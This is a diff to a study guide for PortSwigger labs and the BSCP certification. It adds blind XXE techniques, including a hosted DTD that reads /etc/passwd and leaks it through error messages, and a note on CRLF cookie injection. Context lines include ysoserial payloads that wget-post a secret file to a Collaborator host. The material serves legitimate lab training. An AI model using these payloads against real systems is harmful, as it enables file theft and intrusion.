@@ -1210,7 +1210,7 @@ history.pushState('', '', '/');
   
 ### CSRF duplicated in cookie  
 
->CSRF where token is duplicated in cookie value.
+>In the target we ***identify*** that the CSRF key token is duplicated in the cookie value. Another ***indicator*** is the cookie ```LastSearchTerm``` contain the value searched. By giving search value that contain ```%0d%0a``` we can inject an **end of line** and **new line** characters to create new CSRF cookie and value.  
 
 ```html
 <html>
@@ -1629,7 +1629,8 @@ X-Original-URL: /admin
 
 [Identify XML](#identify-xml)  
 [Xinclude file read](#xinclude-file-read)  
-[DTD Hosted Exploit](#dtd-hosted-exploit)  
+[DTD Blind Out-of-band](#dtd-blind-out-of-band)  
+[DTD Blind Error messages](#dtd-blind-error-messages)  
 [SQL + XML + HackVertor](#sql--xml--hackvertor)  
 [Obfuscation](#obfuscation)  
 
@@ -1665,9 +1666,9 @@ X-Original-URL: /admin
   
 [PortSwigger Lab: Exploiting XInclude to retrieve files](https://portswigger.net/web-security/xxe/lab-xinclude-attack)  
 
-### DTD Hosted Exploit  
+### DTD Blind Out-of-band  
 
->On the exploit server host a exploit file with **Document Type Definition (DTD)** extension, containing the following payload.  
+>On the exploit server change the hosted file name to ```/exploit.dtd``` as the exploit file with **Document Type Definition (DTD)** extension, containing the following payload.  
 
 ```xml
 <!ENTITY % file SYSTEM "file:///home/carlos/secret">
@@ -1686,15 +1687,50 @@ X-Original-URL: /admin
 <users>
     <user>
         <username>Carl Toyota</username>
-        <email>carl@hacked.net</email>
+        <email>carlos@hacked.net</email>
     </user>    
 </users>
-
-```
+```  
 
 ![Exploiting blind XXE to exfiltrate data using a malicious exploit DTD file](images/blind-xxe-exploit-dtd.png)  
 
 [PortSwigger Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)  
+
+>**Rabbit hole:** The submit feedback and screenshot upload on feedback is not to be followed by ***Neo*** down the Matrix.  
+  
+### DTD Blind Error messages  
+
+>If the out of band to Collaborator payload above do not work test if the target will call a ```exploit.dtd``` with invalid file reference and return in error the message to response.  
+
+>Hosted on exploit server the ```/exploit.dtd``` file and body contents.  
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+%eval;
+%exfil;
+```  
+
+>On the stock check XML post request insert the payload between definition and first element.  
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://EXPLOIT.net/exploit.dtd"> %xxe;]>
+  <stockCheck>
+    <productId>
+	  1
+	</productId>
+	<storeId>
+	  1
+	</storeId>
+</stockCheck>
+```  
+
+![DTD Exploit invalid error](images/dtd-exploit-invalid-error.png)  
+
+[PortSwigger Lab: Exploiting blind XXE to retrieve data via error messages](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages)  
+
+>**Rabbit hole:** The submit feedback and screenshot upload on feedback is for ***Neo*** to follow ***Trinity*** in the Matrix.  
   
 ### SQL + XML + HackVertor 
 
@@ -2328,6 +2364,7 @@ CommonsCollections3 'wget http://Collaborator.net --post-file=/home/carlos/secre
 ### YsoSerial  
 
 >Below is ysoserial command line execution to generate base64 encoded serialized cookie object containing payload.  
+  
 >**IMPORTANT:** If you get error message when executing ```java -jar ysoserial <Payload>``` saying something in lines of ***java.lang.IllegalAccessError: class ysoserial.payloads.util.Gadgets***, the switch to alternative Java on Linux with following commands.  
 
 ```bash
@@ -2349,6 +2386,13 @@ java -jar /opt/ysoserial/ysoserial.jar CommonsCollections4 'wget http://Collabor
 
 [PortSwigger Lab: Exploiting Java deserialization with Apache Commons](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons)  
   
+## OS Command Injection
+
+### Feedback  
+
+>OAuth
+
+ 
 # Appendix  
 
 >This section contain **additional** information to solving the PortSwigger labs and approaching the BSCP exam, such as the Youtube content creators, Burp speed scanning technique, python automated scripts I created by following [TJCHacking](https://www.youtube.com/@tjchacking/videos).  
